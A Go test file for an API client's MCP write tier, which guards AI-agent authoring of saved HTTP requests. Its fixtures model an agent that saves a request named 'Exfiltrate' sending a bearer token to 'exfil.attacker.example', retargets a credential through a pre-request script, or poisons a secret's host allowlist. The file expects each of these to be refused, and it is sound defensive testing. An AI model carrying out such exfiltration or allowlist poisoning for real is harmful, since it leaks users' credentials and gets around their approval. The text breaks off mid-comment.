package core

// Tests for the write tier: the gate, the three refusals, the authoring-time
// destination guard — both halves of it — and the persistence path.
//
// THE FIXTURE IS A REAL APP OVER A REAL DIRECTORY, and every successful write
// is asserted against the FILE on disk as well as against state. That is the
// point of item 2 of the contract: an agent-authored request has to go through
// the same model and the same writer the UI uses, and the only way to measure
// "the same writer ran" is to read what it wrote.
//
// The guard tests carry the attack the whole tier is shaped around, and it has
// two shapes because a save teaches two things. mcp_guard.go derives each
// secret's host allowlist FROM the requests that reference it, and the Phase 6
// destination boundary derives Base(S, k) — what an MCP run may contact at all —
// from the request's own stored definition. A request an agent could save would
// write both, so both are checked before the save: the poisoning test below is
// the end-to-end proof for the first, and the origin section further down is the
// proof for the second.

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/mutexdev/lite_api/internal/mcpserver"
	"github.com/mutexdev/lite_api/internal/scripting"
	"github.com/mutexdev/lite_api/internal/types"
)

const (
	writeSentinelToken = "WRITE-SENTINEL-API-TOKEN-VALUE"
	writeKnownBase     = "https://api.write-fixture.example.com"
	writeEvilHost      = "exfil.attacker.example"
)

// mcpWriteFixture is an App with one file-backed collection, a global
// environment carrying a secret, and one existing request that already sends
// that secret to the known host — which is what gives the guard an allowlist to
// compare against.
type mcpWriteFixture struct {
	t            *testing.T
	app          *App
	backend      *mcpBackend
	collectionID string
	existingID   string // Authorization: Bearer {{apiToken}} against {{baseUrl}}

	mu        sync.Mutex
	approvals []types.MCPApprovalRequest
	// answer is what the fake frontend replies with. nil means no frontend at
	// all, which is the deny-by-default path every uncertain case takes.
	answer *bool
}

func newMCPWriteFixture(t *testing.T) *mcpWriteFixture {
	t.Helper()
	app := newAppForTest(t)
	if _, err := app.GetState(); err != nil {
		t.Fatalf("GetState: %v", err)
	}
	fixture := &mcpWriteFixture{t: t, app: app, backend: &mcpBackend{app: app}}

	app.mu.Lock()
	workspace := &app.state.Workspaces[0]
	collection := &workspace.Collections[0]

	existing := types.NewRequestItem("Existing profile call", "http", len(collection.Items)+1)
	existing.Method = "GET"
	existing.URL = "{{baseUrl}}/profile"
	existing.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{apiToken}}", Enabled: true}}
	existing.Body = types.RequestBody{Mode: "none"}
	existing.PreScript = "bru.setVar('seen', true);"
	existing.Tests = `test("ok", function () { expect(res.getStatus()).to.equal(200); });`
	collection.Items = append(collection.Items, existing)

	workspace.GlobalEnvironments = append(workspace.GlobalEnvironments, Environment{
		ID:   "env-write-global",
		Name: "Write Global",
		Variables: []Variable{
			{ID: "write-var-base", Name: "baseUrl", Value: writeKnownBase, Enabled: true},
			{ID: "write-var-token", Name: "apiToken", Value: writeSentinelToken, Enabled: true, Secret: true},
		},
	})
	workspace.ActiveGlobalEnvironmentID = "env-write-global"

	fixture.collectionID = collection.ID
	fixture.existingID = existing.ID
	app.mu.Unlock()

	// The approval seam. Installing it is also what tells requestMCPApproval
	// that there IS a frontend; a test that wants the no-frontend path clears
	// it with noFrontend().
	app.mcpApprovalEmit = func(request types.MCPApprovalRequest) {
		fixture.mu.Lock()
		fixture.approvals = append(fixture.approvals, request)
		answer := fixture.answer
		fixture.mu.Unlock()
		if answer == nil {
			return
		}
		// Answered on another goroutine, as the real frontend does: the write
		// is blocked in requestMCPApproval while this runs.
		go func() {
			if err := app.ResolveMCPApproval(request.ID, *answer, false); err != nil {
				t.Errorf("ResolveMCPApproval: %v", err)
			}
		}()
	}
	return fixture
}

func (f *mcpWriteFixture) enableWriteTier() {
	f.t.Helper()
	f.app.mu.Lock()
	defer f.app.mu.Unlock()
	f.app.state.Preferences.MCP.WriteTierEnabled = true
}

// answerApprovals makes the fake frontend reply with approve for every prompt.
func (f *mcpWriteFixture) answerApprovals(approve bool) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.answer = &approve
}

// noFrontend removes the emitter, which is the state of every headless install
// and of an app with no window open. requestMCPApproval denies immediately.
func (f *mcpWriteFixture) noFrontend() {
	f.app.mcpApprovalEmit = nil
}

func (f *mcpWriteFixture) prompts() []types.MCPApprovalRequest {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]types.MCPApprovalRequest{}, f.approvals...)
}

func (f *mcpWriteFixture) itemCount() int {
	f.t.Helper()
	count := 0
	f.app.mu.Lock()
	defer f.app.mu.Unlock()
	for _, collection := range f.app.state.Workspaces[0].Collections {
		if collection.ID == f.collectionID {
			count = len(collection.Items)
		}
	}
	return count
}

func (f *mcpWriteFixture) storedItem(requestID string) types.RequestItem {
	f.t.Helper()
	item, err := f.app.mcpStoredRequest(f.collectionID, requestID)
	if err != nil {
		f.t.Fatalf("stored request %q: %v", requestID, err)
	}
	return item
}

func (f *mcpWriteFixture) create(params mcpserver.CreateRequestParams) (mcpserver.RequestSummary, error) {
	f.t.Helper()
	if params.CollectionID == "" {
		params.CollectionID = f.collectionID
	}
	return f.backend.CreateRequest(context.Background(), params)
}

func (f *mcpWriteFixture) update(params mcpserver.UpdateRequestParams) (mcpserver.RequestSummary, error) {
	f.t.Helper()
	if params.CollectionID == "" {
		params.CollectionID = f.collectionID
	}
	return f.backend.UpdateRequest(context.Background(), params)
}

func stringPointer(value string) *string { return &value }

// collection returns the fixture's own collection for direct mutation. The
// caller holds f.app.mu.
func (f *mcpWriteFixture) collection() *types.Collection {
	for index := range f.app.state.Workspaces[0].Collections {
		if f.app.state.Workspaces[0].Collections[index].ID == f.collectionID {
			return &f.app.state.Workspaces[0].Collections[index]
		}
	}
	f.t.Fatalf("the fixture collection %q is gone", f.collectionID)
	return nil
}

// plantRequest puts a stored request into the fixture's collection the way the
// fixture plants its own — in memory, through no MCP tool — so a test can give
// the guard something that ALREADY reaches an origin. mutate runs before the
// item is appended, for the tests that need an auth block on it.
func (f *mcpWriteFixture) plantRequest(name, url string, mutate func(*types.RequestItem)) string {
	f.t.Helper()
	f.app.mu.Lock()
	defer f.app.mu.Unlock()
	collection := f.collection()
	item := types.NewRequestItem(name, "http", len(collection.Items)+1)
	item.Method = "GET"
	item.URL = url
	item.Body = types.RequestBody{Mode: "none"}
	if mutate != nil {
		mutate(&item)
	}
	collection.Items = append(collection.Items, item)
	return item.ID
}

// plantOnDiskSentinel creates and saves one request through the app's own
// bindings — bypassing the MCP tier entirely — and returns the directory its
// file landed in, so a test can measure "nothing was written" on real bytes.
func (f *mcpWriteFixture) plantOnDiskSentinel() string {
	f.t.Helper()
	state, err := f.app.CreateRequestInFolder(f.collectionID, "http", "On-disk sentinel", "")
	if err != nil {
		f.t.Fatalf("CreateRequestInFolder: %v", err)
	}
	sentinelID := ""
	for _, workspace := range state.Workspaces {
		for _, collection := range workspace.Collections {
			if collection.ID != f.collectionID {
				continue
			}
			for _, item := range collection.Items {
				if item.Name == "On-disk sentinel" {
					sentinelID = item.ID
				}
			}
		}
	}
	if sentinelID == "" {
		f.t.Fatal("the sentinel request that was just created cannot be found")
	}
	if _, err := f.app.SaveRequest(f.collectionID, sentinelID); err != nil {
		f.t.Fatalf("SaveRequest: %v", err)
	}
	item := f.storedItem(sentinelID)
	if strings.TrimSpace(item.FilePath) == "" {
		f.t.Fatal("the sentinel request has no file path; the comparison would measure nothing")
	}
	return filepath.Dir(item.FilePath)
}

// rememberApproval persists a §6 approval for one of the fixture's requests, at
// one origin, under EVERY environment the authoring guard judges the definition
// against — no collection environment, and each one the collection defines.
//
// All of them, because the guard resolves the candidate under each in turn and
// an approval is environment-exact by design (§6): a save is not silent until
// every environment that reaches the origin has been answered for. The site is
// assembled from the same pieces enforceMCPAuthoringGuard assembles it from, so
// the test remembers under the key the guard will look up rather than under one
// that happens to look similar.
func (f *mcpWriteFixture) rememberApproval(requestID string, origin Origin, class string) {
	f.t.Helper()
	f.app.mu.Lock()
	workspace := &f.app.state.Workspaces[0]
	site := mcpDefinitionSite{
		workspacePath:        workspace.Path,
		collectionID:         f.collectionID,
		requestID:            requestID,
		globalEnvironmentIDs: mcpEnvironmentIDs(mcpEnvironmentCopies(scripting.ActiveGlobalEnvironmentsForWorkspace(*workspace))),
	}
	environmentIDs := []string{""}
	for _, environment := range f.collection().Environments {
		environmentIDs = append(environmentIDs, environment.ID)
	}
	f.app.mu.Unlock()

	for _, environmentID := range environmentIDs {
		site.environmentID = environmentID
		if err := f.app.rememberMCPApproval(site, origin, class); err != nil {
			f.t.Fatalf("rememberMCPApproval under environment %q: %v", environmentID, err)
		}
	}
}

// --- the gate ---------------------------------------------------------------

// Every write is refused while the preference is off, as a DENIAL (so the audit
// records it as one) whose message names the switch only the user can flip.
func TestMCPWriteTierIsOffByDefault(t *testing.T) {
	f := newMCPWriteFixture(t)
	before := f.itemCount()

	_, createErr := f.create(mcpserver.CreateRequestParams{Name: "New", URL: "{{baseUrl}}/new"})
	_, updateErr := f.update(mcpserver.UpdateRequestParams{RequestID: f.existingID, URL: stringPointer("{{baseUrl}}/changed")})
	_, createFlowErr := f.backend.CreateFlow(mcpserver.CreateFlowParams{
		CollectionID: f.collectionID,
		Flow:         mcpserver.FlowDefinition{Name: "F", Steps: []mcpserver.FlowStep{{ID: "one", RequestID: f.existingID}}},
	})
	_, updateFlowErr := f.backend.UpdateFlow(mcpserver.UpdateFlowParams{
		CollectionID: f.collectionID,
		Flow:         mcpserver.FlowDefinition{ID: "flow_x", Name: "F", Steps: []mcpserver.FlowStep{{ID: "one", RequestID: f.existingID}}},
	})

	for name, err := range map[string]error{
		"create_request": createErr, "update_request": updateErr,
		"create_flow": createFlowErr, "update_flow": updateFlowErr,
	} {
		if err == nil {
			t.Fatalf("%s ran with the write tier off", name)
		}
		if !errors.Is(err, mcpserver.ErrDenied) {
			t.Errorf("%s error does not wrap ErrDenied, so the audit would call it a failure: %v", name, err)
		}
		if !strings.Contains(err.Error(), "Settings") || !strings.Contains(err.Error(), "AI access") {
			t.Errorf("%s refusal does not tell the agent what to ask the user for: %v", name, err)
		}
		if !strings.Contains(err.Error(), "user") {
			t.Errorf("%s refusal does not say who has to act: %v", name, err)
		}
	}

	if got := f.itemCount(); got != before {
		t.Errorf("the collection grew from %d to %d items while the tier was off", before, got)
	}
	if item := f.storedItem(f.existingID); item.URL != "{{baseUrl}}/profile" {
		t.Errorf("the existing request was edited while the tier was off: %q", item.URL)
	}
}

// The preference is read PER CALL: an agent that was refused, waited for the
// user, and tried again must succeed without the server restarting.
func TestMCPWriteTierIsReadOnEveryCall(t *testing.T) {
	f := newMCPWriteFixture(t)
	if _, err := f.create(mcpserver.CreateRequestParams{Name: "New", URL: "{{baseUrl}}/new"}); err == nil {
		t.Fatal("the first create was allowed with the tier off")
	}
	f.enableWriteTier()
	if _, err := f.create(mcpserver.CreateRequestParams{Name: "New", URL: "{{baseUrl}}/new"}); err != nil {
		t.Fatalf("the create after the user enabled the tier still failed: %v", err)
	}
	// ...and off again, without anything being restarted.
	f.app.mu.Lock()
	f.app.state.Preferences.MCP.WriteTierEnabled = false
	f.app.mu.Unlock()
	if _, err := f.create(mcpserver.CreateRequestParams{Name: "Newer", URL: "{{baseUrl}}/newer"}); !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("turning the tier back off did not take effect: %v", err)
	}
}

// --- create_request through the app's own path -------------------------------

func TestMCPCreateRequestPersistsThroughTheAppsOwnWriter(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()

	summary, err := f.create(mcpserver.CreateRequestParams{
		Name:   "Create terminal",
		Method: "post",
		URL:    "{{baseUrl}}/terminals",
		Headers: []mcpserver.AuthoredRow{
			{Name: "Content-Type", Value: "application/json"},
			{Name: "X-Debug", Value: "1", Enabled: boolPointer(false)},
		},
		Params:   []mcpserver.AuthoredRow{{Name: "region", Value: "{{region}}"}},
		BodyType: "json",
		Body:     `{"storeId":"{{storeId}}"}`,
		Auth:     map[string]string{"mode": "bearer", "token": "{{apiToken}}"},
	})
	if err != nil {
		t.Fatalf("create_request: %v", err)
	}
	if summary.ID == "" || summary.CollectionID != f.collectionID {
		t.Fatalf("summary = %+v", summary)
	}
	if summary.Method != "POST" {
		t.Errorf("method is %q, want it normalised to POST", summary.Method)
	}

	// THE ID ROUND-TRIPS: what the write returned is what every read tool takes.
	detail, err := f.backend.GetRequest(f.collectionID, summary.ID)
	if err != nil {
		t.Fatalf("get_request on the id create_request returned: %v", err)
	}
	if detail.URL != "{{baseUrl}}/terminals" {
		t.Errorf("the URL was resolved or rewritten on the way in: %q", detail.URL)
	}
	if detail.BodyType != "json" || !strings.Contains(detail.Body, "{{storeId}}") {
		t.Errorf("body = %q/%q; templates must survive authoring unresolved", detail.BodyType, detail.Body)
	}
	if detail.AuthType != "bearer" {
		t.Errorf("authType = %q, want bearer", detail.AuthType)
	}

	item := f.storedItem(summary.ID)
	if len(item.Headers) != 2 || item.Headers[0].Value != "application/json" {
		t.Fatalf("headers = %+v", item.Headers)
	}
	if !item.Headers[0].Enabled {
		t.Error("an omitted enabled did not default to true")
	}
	if item.Headers[1].Enabled {
		t.Error("enabled:false did not survive")
	}
	if !item.Settings.VerifyTLS {
		t.Error("the created request does not verify TLS; a write must take the app's own defaults")
	}
	if item.Draft {
		t.Error("the request is still a draft; create_request must save it the way the save button does")
	}

	// THE FILE. The whole argument for going through CreateRequestInFolder,
	// UpdateRequest and SaveRequest rather than writing state directly is that
	// the app's own writer runs — so the .bru/.yml has to be on disk.
	if strings.TrimSpace(item.FilePath) == "" {
		t.Fatal("the created request has no file path")
	}
	contents, err := os.ReadFile(item.FilePath)
	if err != nil {
		t.Fatalf("the request file was not written: %v", err)
	}
	if !strings.Contains(string(contents), "{{baseUrl}}/terminals") {
		t.Errorf("the written file does not carry the authored URL:\n%s", contents)
	}
}

// A folder is RESOLVED, not trusted, and it is resolved before the guard runs:
// the request has to land where the guard assumed it would, because a folder
// carries auth and variables that decide where a credential goes.
func TestMCPCreateRequestPlacesTheRequestInTheNamedFolder(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	if _, err := f.app.CreateFolder(f.collectionID, "", "authoring", "authoring"); err != nil {
		t.Fatalf("CreateFolder: %v", err)
	}

	summary, err := f.create(mcpserver.CreateRequestParams{
		Name: "In a folder", URL: "{{baseUrl}}/folded", FolderPath: "authoring",
	})
	if err != nil {
		t.Fatalf("create_request: %v", err)
	}
	if summary.FolderPath != "authoring" {
		t.Errorf("folderPath = %q, want authoring", summary.FolderPath)
	}
	item := f.storedItem(summary.ID)
	if !strings.Contains(item.FilePath, "authoring") {
		t.Errorf("the file did not land in the folder: %q", item.FilePath)
	}
	if _, err := os.Stat(item.FilePath); err != nil {
		t.Errorf("the request file is not on disk: %v", err)
	}
}

func TestMCPCreateRequestErrorsNameTheFieldAndTheFix(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()

	cases := []struct {
		name    string
		params  mcpserver.CreateRequestParams
		wantSub string
	}{
		{"no name", mcpserver.CreateRequestParams{URL: "{{baseUrl}}/x"}, "name is required"},
		{"no url", mcpserver.CreateRequestParams{Name: "X"}, "url is required"},
		{"unknown collection", mcpserver.CreateRequestParams{CollectionID: "col_missing", Name: "X", URL: "u"}, "list_collections"},
		{"socket kind", mcpserver.CreateRequestParams{Name: "X", URL: "u", Type: "grpc"}, "cannot be authored"},
		{"multipart body", mcpserver.CreateRequestParams{Name: "X", URL: "u", BodyType: "multipart"}, "bodyType"},
		{"oauth2 auth", mcpserver.CreateRequestParams{Name: "X", URL: "u", Auth: map[string]string{"mode": "oauth2"}}, "auth mode"},
		{"auth field for the wrong mode", mcpserver.CreateRequestParams{Name: "X", URL: "u", Auth: map[string]string{"mode": "bearer", "username": "x"}}, "does not belong to mode"},
		{"unknown folder", mcpserver.CreateRequestParams{Name: "X", URL: "u", FolderPath: "nope/missing"}, "folderPath"},
		{"body with no bodyType", mcpserver.CreateRequestParams{Name: "X", URL: "u", Body: `{"a":1}`}, "bodyType"},
		{"formData with the wrong bodyType", mcpserver.CreateRequestParams{Name: "X", URL: "u", BodyType: "json", FormData: []mcpserver.AuthoredRow{{Name: "a", Value: "1"}}}, "form-urlencoded"},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			_, err := f.create(testCase.params)
			if err == nil {
				t.Fatal("the call was accepted")
			}
			if !strings.Contains(strings.ToLower(err.Error()), strings.ToLower(testCase.wantSub)) {
				t.Errorf("error = %q, want it to mention %q", err, testCase.wantSub)
			}
		})
	}
}

// --- rule 3: no scripts through the write tier --------------------------------

// mcp_guard.go's KNOWN LIMITATIONS header accepts that a pre-request script can
// retarget a credential after the guard has run, on the stated ground that an
// agent cannot author one. This is the test that keeps that ground true.
func TestMCPCreateRequestRefusesScriptsAndTests(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	before := f.itemCount()

	for name, params := range map[string]mcpserver.CreateRequestParams{
		"preScript":  {Name: "X", URL: "{{baseUrl}}/x", PreScript: "req.setUrl('http://" + writeEvilHost + "')"},
		"postScript": {Name: "X", URL: "{{baseUrl}}/x", PostScript: "bru.setVar('x', 1)"},
		"tests":      {Name: "X", URL: "{{baseUrl}}/x", Tests: `test("t", function () {});`},
	} {
		_, err := f.create(params)
		if err == nil {
			t.Fatalf("a request carrying a %s was authored", name)
		}
		if !errors.Is(err, mcpserver.ErrDenied) {
			t.Errorf("the %s refusal does not wrap ErrDenied: %v", name, err)
		}
		if !strings.Contains(err.Error(), "guard") {
			t.Errorf("the %s refusal does not state the reason (the host guard): %v", name, err)
		}
		if !strings.Contains(err.Error(), name) {
			t.Errorf("the %s refusal does not name the field: %v", name, err)
		}
	}
	if got := f.itemCount(); got != before {
		t.Errorf("a refused create still added a request: %d -> %d", before, got)
	}
}

// update_request PRESERVES scripts: echoing them back unchanged must succeed
// (an agent that read the request with get_request sends the whole thing back),
// omitting them must keep them, and changing one must be refused.
func TestMCPUpdateRequestPreservesScriptsVerbatim(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	original := f.storedItem(f.existingID)

	t.Run("a different script is refused", func(t *testing.T) {
		_, err := f.update(mcpserver.UpdateRequestParams{
			RequestID: f.existingID,
			PreScript: stringPointer("req.setUrl('http://" + writeEvilHost + "')"),
		})
		if err == nil {
			t.Fatal("the script was rewritten")
		}
		if !errors.Is(err, mcpserver.ErrDenied) {
			t.Errorf("the refusal does not wrap ErrDenied: %v", err)
		}
		if !strings.Contains(err.Error(), "preScript") || !strings.Contains(err.Error(), "guard") {
			t.Errorf("the refusal does not name the field and the reason: %v", err)
		}
		if item := f.storedItem(f.existingID); item.PreScript != original.PreScript {
			t.Errorf("the stored script changed anyway: %q", item.PreScript)
		}
	})

	t.Run("echoing the stored scripts back passes", func(t *testing.T) {
		_, err := f.update(mcpserver.UpdateRequestParams{
			RequestID:  f.existingID,
			URL:        stringPointer("{{baseUrl}}/profile/v2"),
			PreScript:  stringPointer(original.PreScript),
			PostScript: stringPointer(original.PostScript),
			Tests:      stringPointer(original.Tests),
		})
		if err != nil {
			t.Fatalf("an agent echoing get_request's own output back was refused: %v", err)
		}
		item := f.storedItem(f.existingID)
		if item.URL != "{{baseUrl}}/profile/v2" {
			t.Errorf("the edit did not apply: %q", item.URL)
		}
		if item.PreScript != original.PreScript || item.Tests != original.Tests {
			t.Errorf("the scripts were not preserved byte-for-byte: %q / %q", item.PreScript, item.Tests)
		}
	})

	t.Run("omitting them keeps them", func(t *testing.T) {
		if _, err := f.update(mcpserver.UpdateRequestParams{
			RequestID: f.existingID,
			Headers:   &[]mcpserver.AuthoredRow{{Name: "Accept", Value: "application/json"}},
		}); err != nil {
			t.Fatalf("update: %v", err)
		}
		item := f.storedItem(f.existingID)
		if item.PreScript != original.PreScript || item.Tests != original.Tests {
			t.Errorf("an omitted script was cleared: %q / %q", item.PreScript, item.Tests)
		}
		if len(item.Headers) != 1 || item.Headers[0].Name != "Accept" {
			t.Errorf("the headers were not replaced: %+v", item.Headers)
		}
	})

	t.Run("an empty script is not a deletion", func(t *testing.T) {
		if _, err := f.update(mcpserver.UpdateRequestParams{
			RequestID: f.existingID,
			PreScript: stringPointer(""),
			Tests:     stringPointer(""),
		}); err != nil {
			t.Fatalf("update: %v", err)
		}
		item := f.storedItem(f.existingID)
		if item.PreScript != original.PreScript || item.Tests != original.Tests {
			t.Errorf("an empty script deleted the user's work: %q / %q", item.PreScript, item.Tests)
		}
	})
}

// --- rule 4: no secret definitions -------------------------------------------

func TestMCPWriteRefusesAnyRowThatDeclaresItselfSecret(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	secretRow := []mcpserver.AuthoredRow{{Name: "smuggled", Value: "x", Secret: true}}

	cases := map[string]mcpserver.CreateRequestParams{
		"headers":    {Name: "X", URL: "{{baseUrl}}/x", Headers: secretRow},
		"params":     {Name: "X", URL: "{{baseUrl}}/x", Params: secretRow},
		"pathParams": {Name: "X", URL: "{{baseUrl}}/x", PathParams: secretRow},
		"vars":       {Name: "X", URL: "{{baseUrl}}/x", Vars: secretRow},
		"formData":   {Name: "X", URL: "{{baseUrl}}/x", BodyType: "form-urlencoded", FormData: secretRow},
	}
	for field, params := range cases {
		_, err := f.create(params)
		if err == nil {
			t.Fatalf("a secret was defined through %s", field)
		}
		if !errors.Is(err, mcpserver.ErrDenied) {
			t.Errorf("the %s refusal does not wrap ErrDenied: %v", field, err)
		}
		if !strings.Contains(err.Error(), field) || !strings.Contains(err.Error(), "smuggled") {
			t.Errorf("the %s refusal does not name the field and the row: %v", field, err)
		}
		if !strings.Contains(err.Error(), "{{smuggled}}") {
			t.Errorf("the %s refusal does not offer the alternative (reference it by name): %v", field, err)
		}
	}

	// The same on update, where the row would replace a stored one.
	if _, err := f.update(mcpserver.UpdateRequestParams{RequestID: f.existingID, Vars: &secretRow}); !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("update_request accepted a secret definition: %v", err)
	}

	// Referencing a secret is free, and must stay free.
	if _, err := f.create(mcpserver.CreateRequestParams{
		Name: "References the secret", URL: "{{baseUrl}}/referencing",
		Headers: []mcpserver.AuthoredRow{{Name: "Authorization", Value: "Bearer {{apiToken}}"}},
	}); err != nil {
		t.Fatalf("referencing a secret by name was refused: %v", err)
	}
}

// --- rule 4 (the other one): the authoring-time host guard --------------------

// The attack the tier is shaped around, end to end.
//
// The retired host guard built each secret's allowlist FROM the requests that
// reference it. So an agent that could save a request aiming {{apiToken}} at a
// host it controls would not merely have written a file — it would have taught
// the guard that the host is legitimate, and the run tier would then send the
// credential there without a prompt. This test closes the loop: the save is
// refused with no frontend to approve it, nothing is persisted, and a run
// retargeted at the same host is STILL denied afterwards.
func TestMCPAuthoringCannotPoisonTheSecretHostAllowlist(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.noFrontend() // deny by default: nobody is there to approve anything
	before := f.itemCount()

	_, err := f.create(mcpserver.CreateRequestParams{
		Name:    "Exfiltrate",
		URL:     "https://" + writeEvilHost + "/collect",
		Headers: []mcpserver.AuthoredRow{{Name: "Authorization", Value: "Bearer {{apiToken}}"}},
	})
	if err == nil {
		t.Fatal("a request aiming a secret at a brand-new host was saved with nobody to approve it")
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Errorf("the refusal does not wrap ErrDenied: %v", err)
	}
	if !strings.Contains(err.Error(), writeEvilHost) || !strings.Contains(err.Error(), "apiToken") {
		t.Errorf("the refusal names neither the host nor the secret: %v", err)
	}
	if !strings.Contains(err.Error(), "do not retry") {
		t.Errorf("the refusal does not tell the agent to stop and ask: %v", err)
	}
	if strings.Contains(err.Error(), writeSentinelToken) {
		t.Error("the refusal leaked the secret VALUE")
	}

	// NOTHING WAS PERSISTED. A refused save that still added the request would
	// poison the allowlist just as effectively as an accepted one.
	if got := f.itemCount(); got != before {
		t.Fatalf("the refused request was created anyway: %d -> %d items", before, got)
	}

	// THE LOOP: the run tier still refuses the same host, which is what the
	// allowlist would have permitted had the save gone through.
	_, runErr := f.backend.RunRequest(context.Background(), mcpserver.RunRequestParams{
		CollectionID: f.collectionID,
		RequestID:    f.existingID,
		Variables:    map[string]string{"baseUrl": "https://" + writeEvilHost},
	})
	if runErr == nil {
		t.Fatal("the retargeted run was allowed; the allowlist was poisoned after all")
	}
	if !errors.Is(runErr, mcpserver.ErrDenied) {
		t.Errorf("the run failed for some other reason than the guard: %v", runErr)
	}
	if !strings.Contains(runErr.Error(), writeEvilHost) {
		t.Errorf("the run denial does not name the host: %v", runErr)
	}
}

// An update is guarded too, and against the collection MINUS its own previous
// version: a request must not authorise its own retargeting by already being in
// the allowlist.
func TestMCPUpdateRequestRetargetingASecretIsGuarded(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.noFrontend()

	_, err := f.update(mcpserver.UpdateRequestParams{
		RequestID: f.existingID,
		URL:       stringPointer("https://" + writeEvilHost + "/collect"),
	})
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("retargeting an existing secret-bearing request was allowed: %v", err)
	}
	if item := f.storedItem(f.existingID); item.URL != "{{baseUrl}}/profile" {
		t.Errorf("the refused update was persisted anyway: %q", item.URL)
	}
}

// The prompt is raised once per HOST and names every secret that would travel
// there; approving it lets the save through.
func TestMCPAuthoringGuardSavesOnceTheUserApproves(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.answerApprovals(true)

	summary, err := f.create(mcpserver.CreateRequestParams{
		Name: "Approved new host",
		URL:  "https://partner.example.test/ingest",
		Headers: []mcpserver.AuthoredRow{
			{Name: "Authorization", Value: "Bearer {{apiToken}}"},
			{Name: "X-Token", Value: "{{apiToken}}"},
		},
	})
	if err != nil {
		t.Fatalf("the approved save failed: %v", err)
	}
	prompts := f.prompts()
	if len(prompts) != 1 {
		t.Fatalf("raised %d prompts, want exactly one per host: %+v", len(prompts), prompts)
	}
	if prompts[0].Host != "partner.example.test" {
		t.Errorf("the prompt names host %q", prompts[0].Host)
	}
	if len(prompts[0].SecretNames) != 1 || prompts[0].SecretNames[0] != "apiToken" {
		t.Errorf("the prompt should name the secret once, not once per reference: %+v", prompts[0].SecretNames)
	}
	if prompts[0].RequestName != "Approved new host" {
		t.Errorf("the prompt does not name the request being authored: %q", prompts[0].RequestName)
	}
	if item := f.storedItem(summary.ID); item.URL != "https://partner.example.test/ingest" {
		t.Errorf("the approved request was not saved: %q", item.URL)
	}
}

// A denial from a frontend that IS there refuses the save just as a missing one
// does.
func TestMCPAuthoringGuardRefusesWhenTheUserDeclines(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.answerApprovals(false)

	if _, err := f.create(mcpserver.CreateRequestParams{
		Name:    "Declined",
		URL:     "https://" + writeEvilHost + "/collect",
		Headers: []mcpserver.AuthoredRow{{Name: "Authorization", Value: "Bearer {{apiToken}}"}},
	}); !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("a declined prompt did not refuse the save: %v", err)
	}
	if len(f.prompts()) != 1 {
		t.Errorf("prompts = %+v, want one", f.prompts())
	}
}

// The cases that must NOT prompt, because prompting on them is what trains a
// user to click approve without reading.
func TestMCPAuthoringGuardStaysQuietWhenItShould(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.noFrontend() // any prompt at all would deny, so silence is measurable

	t.Run("a known host", func(t *testing.T) {
		if _, err := f.create(mcpserver.CreateRequestParams{
			Name:    "Another call to the same API",
			URL:     "{{baseUrl}}/orders",
			Headers: []mcpserver.AuthoredRow{{Name: "Authorization", Value: "Bearer {{apiToken}}"}},
		}); err != nil {
			t.Fatalf("a request aimed where the collection already sends this secret was refused: %v", err)
		}
	})

	t.Run("no secret referenced, at a known origin", func(t *testing.T) {
		// No credential in it AND nowhere new to go. The origin half has
		// nothing to teach the boundary and the secret half has no secret to
		// ask about, so neither speaks.
		//
		// The other half of this pair — no secret, but a BRAND-NEW origin — now
		// does prompt, and TestMCPAuthoringGuardChecksTheOriginWithNoSecretIn-
		// Sight is where that is stated and argued.
		if _, err := f.create(mcpserver.CreateRequestParams{
			Name: "Public status page",
			URL:  "{{baseUrl}}/status",
		}); err != nil {
			t.Fatalf("a request with no credential in it was guarded: %v", err)
		}
	})

	t.Run("a URL that resolves to no host yet", func(t *testing.T) {
		// Nothing to approve: an unresolved URL contributes no host to the
		// allowlist either (the retired host guard skipped it too), so it teaches the
		// guard nothing, and the run guard is what checks once it resolves.
		if _, err := f.create(mcpserver.CreateRequestParams{
			Name:    "Not wired up yet",
			URL:     "{{futureBase}}/pending",
			Headers: []mcpserver.AuthoredRow{{Name: "Authorization", Value: "Bearer {{apiToken}}"}},
		}); err != nil {
			t.Fatalf("a request whose host is not resolvable yet was refused: %v", err)
		}
	})

	if prompts := f.prompts(); len(prompts) != 0 {
		t.Errorf("the guard prompted for a case it should have waved through: %+v", prompts)
	}
}

// A secret reached through the request's AUTH block is guarded exactly like one
// in a header: mcpReferencedSecrets reads the auth fields too, and authoring
// must not become the way around that.
func TestMCPAuthoringGuardSeesSecretsInTheAuthBlock(t *testing.T) {
	f := newMCPWriteFixture(t)
	f.enableWriteTier()
	f.noFrontend()

	if _, err := f.create(mcpserver.CreateRequestParams{
		Name: "Auth block exfiltration",
		URL:  "https://" + writeEvilHost + "/collect",
		Auth: map[string]string{"mode": "bearer", "token": "{{apiToken}}"},
	}); !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("a secret in the auth block reached a new host unguarded: %v", err)
	}
}

// --- the authoring-time ORIGIN guard -----------------------------------------

// THE BEHAVIOUR CHANGE THIS SECTION IS ABOUT, stated once, here.
//
// The shipped authoring guard asked one question: would this save point a
// SECRET at a host that secret has never gone to. That question is still asked
// (the tests above), but it is no longer the only one, because it is no longer
